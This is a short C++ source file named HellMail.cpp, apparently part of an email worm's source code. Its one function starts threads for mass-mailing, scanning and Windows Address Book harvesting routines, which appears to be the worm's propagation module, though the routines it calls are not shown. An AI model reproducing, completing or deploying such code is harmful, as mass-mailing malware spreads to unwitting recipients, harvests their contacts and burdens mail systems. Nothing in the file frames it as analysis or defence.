/** HellMail.cpp **/

#include "vInclude.h"
#include "vPOEb.h"

extern "C" {
	#include "mail/lib.h"
	#include "mail/massmail.h"
	#include "mail/scan.h"
}

void *CMail::Run()
{
	massmail_init();
	CreateThread(NULL, 0, (unsigned long (__stdcall *)(void *))massmail_main, 0, 0, NULL);
	scan_init();
	CreateThread(NULL, 0, (unsigned long (__stdcall *)(void *))scan_main, 0, 0, NULL);
	CreateThread(NULL, 0, (unsigned long (__stdcall *)(void *))Wab_Mail, 0, 0, NULL);
	return NULL;
}
